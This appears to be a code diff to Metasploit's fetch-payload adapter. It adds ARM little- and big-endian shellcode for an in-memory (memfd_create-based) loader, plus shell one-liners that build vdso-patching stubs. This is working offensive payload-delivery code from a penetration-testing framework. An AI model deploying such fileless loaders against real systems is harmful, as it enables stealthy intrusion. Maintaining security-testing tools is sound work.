@@ -282,25 +282,56 @@ module Msf::Payload::Adapter::Fetch
       # pid = getpid()
       # kill(pid,SIGSTOP)
       in_memory_loader_asm = [
-                  0x0a0080d2, #0x1000:	mov	x10, #0	0x0a0080d2
-                  0xea0300f9, #0x1004:	str	x10, [sp]	0xea0300f9
-                  0xe0030091, #0x1008:	mov	x0, sp	0xe0030091
-                  0x210080d2, #0x100c:	mov	x1, #1	0x210080d2
-                  0xe82280d2, #0x1010:	mov	x8, #0x117	0xe82280d2
-                  0x010000d4, #0x1014:	svc	#0	0x010000d4
-                  0xc80580d2, #0x1018:	mov	x8, #0x2e	0xc80580d2
-                  0x010000d4, #0x101c:	svc	#0	0x010000d4
-                  0x881580d2, #0x1020:	mov	x8, #0xac	0x881580d2
-                  0x010000d4, #0x1024:	svc	#0	0x010000d4
-                  0x610280d2, #0x1028:	mov	x1, #0x13	0x610280d2
-                  0x281080d2, #0x102c:	mov	x8, #0x81	0x281080d2
-                  0x010000d4, #0x1030:	svc	#0	0x010000d4
+          0x0a0080d2, #0x1000:	mov	x10, #0	0x0a0080d2
+          0xea0300f9, #0x1004:	str	x10, [sp]	0xea0300f9
+          0xe0030091, #0x1008:	mov	x0, sp	0xe0030091
+          0x210080d2, #0x100c:	mov	x1, #1	0x210080d2
+          0xe82280d2, #0x1010:	mov	x8, #0x117	0xe82280d2
+          0x010000d4, #0x1014:	svc	#0	0x010000d4
+          0xc80580d2, #0x1018:	mov	x8, #0x2e	0xc80580d2
+          0x010000d4, #0x101c:	svc	#0	0x010000d4
+          0x881580d2, #0x1020:	mov	x8, #0xac	0x881580d2
+          0x010000d4, #0x1024:	svc	#0	0x010000d4
+          0x610280d2, #0x1028:	mov	x1, #0x13	0x610280d2
+          0x281080d2, #0x102c:	mov	x8, #0x81	0x281080d2
+          0x010000d4, #0x1030:	svc	#0	0x010000d4
       ]
       payload = in_memory_loader_asm.pack("N*")
     when 'armle'
-      puts 'Not implemented yet'
+      in_memory_loader_asm = [
+          0x0020a0e3, #0x1000:	mov	r2, #0	0x0020a0e3
+          0x04202de5, #0x1004:	str	r2, [sp, #-4]!	0x04202de5
+          0x0d00a0e1, #0x1008:	mov	r0, sp	0x0d00a0e1
+          0x0110a0e3, #0x100c:	mov	r1, #1	0x0110a0e3
+          0x8370a0e3, #0x1010:	mov	r7, #0x83	0x8370a0e3
+          0xfe7087e2, #0x1014:	add	r7, r7, #0xfe	0xfe7087e2
+          0x000000ef, #0x1018:	svc	#0	0x000000ef
+          0x5d70a0e3, #0x101c:	mov	r7, #0x5d	0x5d70a0e3
+          0x000000ef, #0x1020:	svc	#0	0x000000ef
+          0x1d70a0e3, #0x1024:	mov	r7, #0x1d	0x1d70a0e3
+          0x000000ef, #0x1028:	svc	#0	0x000000ef
+
+      ]
+      payload = in_memory_loader_asm.pack("V*")
     when 'armbe'
-      puts 'Not implemented yet'
+      # fd = memfd_create()
+      # ftruncate(fd, null)
+      # pause()
+      in_memory_loader_asm = [
+          0xe3a02000, #0x1000:	mov	r2, #0	0xe3a02000
+          0xe52d2004, #0x1004:	str	r2, [sp, #-4]!	0xe52d2004
+          0xe1a0000d, #0x1008:	mov	r0, sp	0xe1a0000d
+          0xe3a01001, #0x100c:	mov	r1, #1	0xe3a01001
+          0xe3a07083, #0x1010:	mov	r7, #0x83	0xe3a07083
+          0xe28770fe, #0x1014:	add	r7, r7, #0xfe	0xe28770fe
+          0xef000000, #0x1018:	svc	#0	0xef000000
+          0xe3a0705d, #0x101c:	mov	r7, #0x5d	0xe3a0705d
+          0xef000000, #0x1020:	svc	#0	0xef000000
+          0xe3a0701d, #0x1024:	mov	r7, #0x1d	0xe3a0701d
+          0xef000000, #0x1028:	svc	#0	0xef000000
+
+      ]
+      payload = in_memory_loader_asm.pack("V*")
     when 'mips64'
       puts 'Not implemented yet'
     when 'mipsbe'
@@ -327,7 +358,11 @@ module Msf::Payload::Adapter::Fetch
     when 'x86'
       %^"b8"$(echo $(printf %08x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')"ffe0"^
     when 'aarch64'
-      %^"4000005800001fd6"$(endian $(printf %016x $vdso_addr))^
+      %^"4000005800001fd6"$(echo $(printf %16x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')^
+    when 'armle'
+      %^$(echo $(printf %04x $vdso_addr)  |  awk '{print substr($0,3,2)}')"7"$(echo $(printf %04x $vdso_addr)  |  awk '{print substr($0,2,1)}')"0"$(echo $(printf %04x $vdso_addr)  |  awk '{print substr($0,1,1)}')"e3"^
+    when 'armbe'
+      %^"e30"$(echo $(printf %04x $vdso_addr)  |  awk '{print substr($0,1,1)}')"7"$(echo $(printf %04x $vdso_addr)  |  awk '{print substr($0,2,1)}')""$(echo $(printf %04x $vdso_addr)  |  awk '{print substr($0,3,2)}')^
     else
       fail_with(Msf::Module::Failure::BadConfig, 'Unsupported architecture')
     end
